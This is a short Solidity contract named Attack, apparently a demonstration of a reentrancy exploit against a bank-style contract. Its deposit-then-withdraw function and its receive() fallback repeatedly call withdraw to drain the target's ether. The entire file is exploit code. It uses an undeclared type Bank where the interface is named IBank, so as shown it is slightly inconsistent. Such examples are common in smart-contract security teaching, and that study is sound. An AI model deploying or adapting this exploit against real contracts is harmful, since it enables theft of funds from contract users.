interface IBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Attack {
    Bank public bank;
    address public owner;

    constructor(address _bankAddress) {
        bank = Bank(_bankAddress);
        owner = msg.sender;
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }
}